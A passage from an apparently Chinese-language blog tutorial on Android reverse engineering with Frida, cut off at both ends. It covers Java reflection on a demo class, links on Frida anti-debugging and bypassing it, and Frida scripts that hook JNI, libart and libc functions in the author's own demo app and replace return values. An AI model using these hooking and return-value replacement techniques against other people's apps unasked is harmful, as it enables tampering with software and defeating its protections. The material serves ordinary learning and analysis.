class="line"></span><br><span class="line">        <span class="comment">//对于Field的get方法，如果是static，则传入null即可;如果不是，则需要传入一个类的实例</span></span><br><span class="line">        String valueStaticPublic = (String) publicStaticField.get(<span class="keyword">null</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"publicStaticField.get-&gt;"</span> + valueStaticPublic);</span><br><span class="line"></span><br><span class="line">        String valuePublic = (String) publicField.get(sakuraTest);</span><br><span class="line">        Log.i(TAG, <span class="string">"publicField.get-&gt;"</span> + valuePublic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对于private属性，需要设置Accessible</span></span><br><span class="line">        Field privateStaticField = testClazz3.getDeclaredField(<span class="string">"privateStaticField"</span>);</span><br><span class="line">        privateStaticField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        String valuePrivte = (String) privateStaticField.get(<span class="keyword">null</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"modified before privateStaticField.get-&gt;"</span> + valuePrivte);</span><br><span class="line"></span><br><span class="line">        privateStaticField.set(<span class="keyword">null</span>, <span class="string">"modified"</span>);</span><br><span class="line"></span><br><span class="line">        valuePrivte = (String) privateStaticField.get(<span class="keyword">null</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"modified after privateStaticField.get-&gt;"</span> + valuePrivte);</span><br><span class="line"></span><br><span class="line">        Field[] fields = testClazz3.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field i : fields) &#123;</span><br><span class="line">            Log.i(TAG, <span class="string">"testClazz3.getDeclaredFields-&gt;"</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得类中method相关的方法</span></span><br><span class="line">        Method publicStaticMethod = testClazz3.getDeclaredMethod(<span class="string">"publicStaticFunc"</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"testClazz3.getDeclaredMethod-&gt;"</span> + publicStaticMethod);</span><br><span class="line"></span><br><span class="line">        publicStaticMethod.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Method publicMethod = testClazz3.getDeclaredMethod(<span class="string">"publicFunc"</span>, java.lang.String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Log.i(TAG, <span class="string">"testClazz3.getDeclaredMethod-&gt;"</span> + publicMethod);</span><br><span class="line"></span><br><span class="line">        publicMethod.invoke(sakuraTest, <span class="string">" sakura"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the 'native-lib' native library,</span></span><br><span class="line"><span class="comment">     * which is packaged with this application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringWithJNI</span><span class="params">(String context)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"sakura_test"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String publicStaticField = <span class="string">"i am a publicStaticField"</span>;</span><br><span class="line">    <span class="keyword">public</span> String publicField = <span class="string">"i am a publicField"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String privateStaticField = <span class="string">"i am a privateStaticField"</span>;</span><br><span class="line">    <span class="keyword">private</span> String privateField = <span class="string">"i am a privateField"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">publicStaticFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.d(TAG, <span class="string">"I`m from publicStaticFunc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publicFunc</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        Log.d(TAG, <span class="string">"I`m from publicFunc"</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">privateStaticFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"I`m from privateFunc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">privateFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"I`m from privateFunc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.784</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: Classloader.loadClass-&gt;<span class="class"><span class="keyword">class</span> <span class="title">myapplication</span>.<span class="title">example</span>.<span class="title">com</span>.<span class="title">ndk_demo</span>.<span class="title">Test</span></span></span><br><span class="line">12-26 23:57:11.784 17682-17682/myapplication.example.com.ndk_demo I/sakura: Classloader.loadClass-&gt;class myapplication.example.com.ndk_demo.Test</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.784</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: Classloader.loadClass-&gt;myapplication.example.com.ndk_demo.Test</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredField-&gt;<span class="keyword">public</span> <span class="keyword">static</span> java.lang.String myapplication.example.com.ndk_demo.Test.publicStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredField-&gt;<span class="keyword">public</span> java.lang.String myapplication.example.com.ndk_demo.Test.publicField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: publicStaticField.get-&gt;i am a publicStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: publicField.get-&gt;i am a publicField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: modified before privateStaticField.get-&gt;i am a privateStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: modified after privateStaticField.get-&gt;modified</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">private</span> java.lang.String myapplication.example.com.ndk_demo.Test.privateField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">public</span> java.lang.String myapplication.example.com.ndk_demo.Test.publicField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.lang.String myapplication.example.com.ndk_demo.Test.TAG</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">private</span> <span class="keyword">static</span> java.lang.String myapplication.example.com.ndk_demo.Test.privateStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">public</span> <span class="keyword">static</span> java.lang.String myapplication.example.com.ndk_demo.Test.publicStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredMethod-&gt;<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> myapplication.example.com.ndk_demo.Test.publicStaticFunc()</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo D/sakura_test: I`m from publicStaticFunc</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.786</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredMethod-&gt;<span class="keyword">public</span> <span class="keyword">void</span> myapplication.example.com.ndk_demo.Test.publicFunc(java.lang.String)</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.786</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo D/sakura_test: I`m from publicFunc sakura</span><br></pre></td></tr></table></figure><p><code>memory list modules</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-065833.png" alt=""></p><h2 id="Frida反调试"><a href="#Frida反调试" class="headerlink" title="Frida反调试"></a>Frida反调试</h2><p>这一节的主要内容就是关于反调试的原理和如何破解反调试，重要内容还是看文章理解即可。<br>因为我并不需要做反调试相关的工作，所以部分内容略过。</p><ul><li>Frida反调试与反反调试基本思路<br>（Java层API、Native层API、Syscall)<ul><li><a href="https://github.com/qtfreet00/AntiFrida" target="_blank" rel="noopener">AntiFrida</a></li><li><a href="https://github.com/b-mueller/frida-detection-demo" target="_blank" rel="noopener">frida-detection-demo</a></li><li><a href="https://bbs.pediy.com/thread-217482.htm" target="_blank" rel="noopener">多种特征检测Frida</a></li><li><a href="https://yq.aliyun.com/articles/71120" target="_blank" rel="noopener">来自高维的对抗 - 逆向TinyTool自制</a></li><li><a href="https://bbs.pediy.com/thread-253868.htm" target="_blank" rel="noopener">Unicorn 在 Android 的应用</a></li></ul></li></ul><h2 id="Frida-native-hook-符号hook-JNI、art-amp-libc"><a href="#Frida-native-hook-符号hook-JNI、art-amp-libc" class="headerlink" title="Frida native hook : 符号hook JNI、art&amp;libc"></a>Frida native hook : 符号hook JNI、art&amp;libc</h2><h3 id="Native函数的Java-Hook及主动调用"><a href="#Native函数的Java-Hook及主动调用" class="headerlink" title="Native函数的Java Hook及主动调用"></a>Native函数的Java Hook及主动调用</h3><p>对native函数的java层hook和主动调用和普通java函数完全一致，略过。</p><h3 id="jni-h头文件导入"><a href="#jni-h头文件导入" class="headerlink" title="jni.h头文件导入"></a><code>jni.h</code>头文件导入</h3><p>导入jni.h，先search一下这个文件在哪。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Library&#x2F;Android&#x2F;sdk$ find .&#x2F; -name &quot;jni.h&quot;</span><br><span class="line">.&#x2F;&#x2F;ndk-bundle&#x2F;sysroot&#x2F;usr&#x2F;include&#x2F;jni.h</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-103826.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error &#x2F;Users&#x2F;sakura&#x2F;Library&#x2F;Android&#x2F;sdk&#x2F;ndk-bundle&#x2F;sysroot&#x2F;usr&#x2F;include&#x2F;jni.h,27: Can&#39;t open include file &#39;stdarg.h&#39;</span><br><span class="line">Total 1 errors</span><br><span class="line">Caching &#39;Exports&#39;... ok</span><br></pre></td></tr></table></figure><p>报错，所以拷贝一份jni.h出来</p><p>将这两个头文件导入删掉<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-104029.png" alt=""></p><p>导入成功<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-104113.png" alt=""></p><p>现在就能识别_JNIEnv了，如图<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-104131.png" alt=""></p><h3 id="JNI函数符号hook"><a href="#JNI函数符号hook" class="headerlink" title="JNI函数符号hook"></a>JNI函数符号hook</h3><p>先查看一下导出了哪些函数。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-102552.png" alt=""></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> JNIEXPORT jstring JNICALL</span><br><span class="line">Java_myapplication_example_com_ndk_1demo_MainActivity_stringFromJNI(</span><br><span class="line">        JNIEnv *env,</span><br><span class="line">        jobject <span class="comment">/* this */</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> hello = <span class="string">"Hello from C++"</span>;</span><br><span class="line">    LOGD(<span class="string">"sakura1328"</span>);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line">Java_myapplication_example_com_ndk_1demo_MainActivity_stringWithJNI(JNIEnv *env, jobject instance,</span><br><span class="line">                                                                    jstring context_) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *context = env-&gt;GetStringUTFChars(context_, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> context_size = env-&gt;GetStringUTFLength(context_);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOGD(<span class="string">"%s\n"</span>, context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    env-&gt;ReleaseStringUTFChars(context_, context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"sakura1328"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有几个需要的API。</p><ul><li>首先是找到是否so被加载，通过<code>Process.enumerateModules()</code>,这个API可以枚举被加载到内存的modules。</li><li>然后通过<code>Module.findBaseAddress(module name)</code>来查找要hook的函数所在的so的基地址，如果找不到就返回null。</li><li>然后可以通过<code>findExportByName(moduleName: string, exportName: string): NativePointer</code>来查找导出函数的绝对地址。如果不知道moduleName是什么，可以传入一个null进入，但是会花费一些时间遍历所有的module。如果找不到就返回null。</li><li>找到地址之后，就可以拦截function/instruction的执行。通过<code>Interceptor.attach</code>。使用方法见下代码。</li><li>另外为了将jstring的值打印出来，可以使用jenv的函数getStringUtfChars，就像正常的写native程序一样。<br><code>Java.vm.getEnv().getStringUtfChars(args[2], null).readCString()</code></li></ul><p>这里我是循环调用的string_with_jni，如果不循环调用，那就要主动调用一下这个函数，或者hook dlopen。<br>hook dlopen的方法在<a href="https://github.com/lasting-yang/frida_dump/blob/master/dump_dex.js" target="_blank" rel="noopener">这个代码</a>可以参考。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_native</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(JSON.stringify(Process.enumerateModules()));</span></span><br><span class="line">    <span class="keyword">var</span> libnative_addr = Module.findBaseAddress(<span class="string">"libnative-lib.so"</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"libnative_addr is: "</span> + libnative_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (libnative_addr) &#123;</span><br><span class="line">        <span class="keyword">var</span> string_with_jni_addr = Module.findExportByName(<span class="string">"libnative-lib.so"</span>, </span><br><span class="line">        <span class="string">"Java_myapplication_example_com_ndk_1demo_MainActivity_stringWithJNI"</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"string_with_jni_addr is: "</span> + string_with_jni_addr)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(string_with_jni_addr, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"string_with_jni args: "</span> + args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>])</span><br><span class="line">            <span class="built_in">console</span>.log(Java.vm.getEnv().getStringUtfChars(args[<span class="number">2</span>], <span class="literal">null</span>).readCString())</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"retval:"</span>, retval)</span><br><span class="line">            <span class="built_in">console</span>.log(Java.vm.getEnv().getStringUtfChars(retval, <span class="literal">null</span>).readCString())</span><br><span class="line">            <span class="keyword">var</span> newRetval = Java.vm.getEnv().newStringUtf(<span class="string">"new retval from hook_native"</span>);</span><br><span class="line">            retval.replace(ptr(newRetval));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libnative_addr is: 0x7a0842f000</span><br><span class="line">string_with_jni_addr is: 0x7a08436194</span><br><span class="line">[Google Pixel::myapplication.example.com.ndk_demo]-&gt; string_with_jni args: 0x7a106cc1c0 0x7ff0b71da4 0x7ff0b71da8</span><br><span class="line">sakura</span><br><span class="line">retval: 0x75</span><br><span class="line">sakura1328</span><br></pre></td></tr></table></figure><p>这里还写了一个hook env里的GetStringUTFChars的代码，和上面一样，不赘述了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_art</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> addr_GetStringUTFChars = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//console.log( JSON.stringify(Process.enumerateModules()));</span></span><br><span class="line">    <span class="keyword">var</span> symbols = Process.findModuleByName(<span class="string">"libart.so"</span>).enumerateSymbols();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;symbols.length;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].name;</span><br><span class="line">        <span class="keyword">if</span>((symbol.indexOf(<span class="string">"CheckJNI"</span>)==<span class="number">-1</span>)&amp;&amp;(symbol.indexOf(<span class="string">"JNI"</span>)&gt;=<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(symbol.indexOf(<span class="string">"GetStringUTFChars"</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(symbols[i].name);</span><br><span class="line">                <span class="built_in">console</span>.log(symbols[i].address);</span><br><span class="line">                addr_GetStringUTFChars = symbols[i].address;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"addr_GetStringUTFChars:"</span>, addr_GetStringUTFChars);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        Interceptor.attach(addr_GetStringUTFChars, &#123;</span><br><span class="line">            onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"addr_GetStringUTFChars OnEnter args[0],args[1]"</span>,args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">                <span class="comment">//console.log(hexdump(args[0].readPointer()));</span></span><br><span class="line">                <span class="comment">//console.log(Java.vm.tryGetEnv().getStringUtfChars(args[0]).readCString()); </span></span><br><span class="line">            &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"addr_GetStringUTFChars OnLeave"</span>,ptr(retval).readCString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JNI函数参数、返回值打印和替换"><a href="#JNI函数参数、返回值打印和替换" class="headerlink" title="JNI函数参数、返回值打印和替换"></a>JNI函数参数、返回值打印和替换</h3><ul><li>libc函数符号hook</li><li>libc函数参数、返回值打印和替换<br>hook libc的也和上面的完全一样，也不赘述了。<br>所以看到这里，究其本质就是找到导出符号和它所在的so基地址了。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_libc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> symbols = Process.findModuleByName(<span class="string">"libc.so"</span>).enumerateSymbols();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;symbols.length;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].name;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(symbol.indexOf(<span class="string">"pthread_create"</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//console.log(symbols[i].name);</span></span><br><span class="line">            <span class="comment">//console.log(symbols[i].address);</span></span><br><span class="line">            pthread_create_addr = symbols[i].address;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"pthread_create_addr,"</span>,pthread_create_addr);</span><br><span class="line">    Interceptor.attach(pthread_create_addr,&#123;</span><br><span class="line">        onEnter:<span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"pthread_create_addr args[0],args[1],args[2],args[3]:"</span>,args[<span class="number">0</span>],args[<span class="number">1</span>],args[<span class="number">2</span>],args[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"retval is:"</span>,retval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Frida-native-hook-JNI-Onload-动态注册-inline-hook-native层调用栈打印"><a href="#Frida-native-hook-JNI-Onload-动态注册-inline-hook-native层调用栈打印" class="headerlink" title="Frida native hook : JNI_Onload/动态注册/inline_hook/native层调用栈打印"></a>Frida native hook : JNI_Onload/动态注册/inline_hook/native层调用栈打印</h2><p><a href="https://github.com/android/ndk-samples" target="_blank" rel="noopener">https://github.com/android/ndk-samples</a></p><h3 id="JNI-Onload-动态注册原理"><a href="#JNI-Onload-动态注册原理" class="headerlink" title="JNI_Onload/动态注册原理"></a>JNI_Onload/动态注册原理</h3><ul><li>JNI_Onload/动态注册/Frida hook RegisterNative<ul><li><a href="https://zhuanlan.kanxue.com/article-4482.htm" target="_blank" rel="noopener">JNI与动态注册</a></li><li><a href="https://eternalsakura13.com/2018/02/08/jni2/">native 方法的动态注册</a></li><li><a href="https://github.com/lasting-yang/frida_hook_libart" target="_blank" rel="noopener">Frida hook art</a></li></ul></li></ul><p>详细的内容参见我写的文章，这里只给出栗子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Log.d(TAG,stringFromJNI2());</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI2</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">stringFromJNI2</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        JNIEnv *env,</span></span></span><br><span class="line"><span class="function"><span class="params">        jclass clazz)</span> </span>&#123;</span><br><span class="line">    jclass testClass = env-&gt;FindClass(<span class="string">"myapplication/example/com/ndk_demo/Test"</span>);</span><br><span class="line">    jfieldID publicStaticField = env-&gt;GetStaticFieldID(testClass, <span class="string">"publicStaticField"</span>,</span><br><span class="line">                                                       <span class="string">"Ljava/lang/String;"</span>);</span><br><span class="line">    jstring publicStaticFieldValue = (jstring) env-&gt;GetStaticObjectField(testClass,</span><br><span class="line">                                                                         publicStaticField);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *value_ptr = env-&gt;GetStringUTFChars(publicStaticFieldValue, <span class="literal">NULL</span>);</span><br><span class="line">    LOGD(<span class="string">"now content is %s"</span>, value_ptr);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> hello = <span class="string">"Hello from C++ stringFromJNI2"</span>;</span><br><span class="line">    <span class="keyword">return</span> 